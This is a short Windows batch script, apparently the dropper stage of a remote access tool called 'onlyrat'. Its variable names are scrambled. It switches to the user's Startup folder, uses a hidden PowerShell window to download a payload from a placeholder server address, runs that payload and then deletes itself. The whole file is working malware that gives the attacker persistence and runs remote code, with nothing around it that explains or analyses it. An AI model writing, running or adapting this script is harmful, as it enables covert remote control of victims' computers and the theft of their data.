@echo off
set "EcSjRhAguo=X.X.X.X"
set "XNjFYKECht=%cd%"
set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %YKHfpmMRoQ%
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://%EcSjRhAguo%/onlyrat/payloads/v1.cmd -OutFile wEaoFkNduy.cmd"
powershell ./wEaoFkNduy.cmd
cd "%XNjFYKECht%"
del from-vps.cmd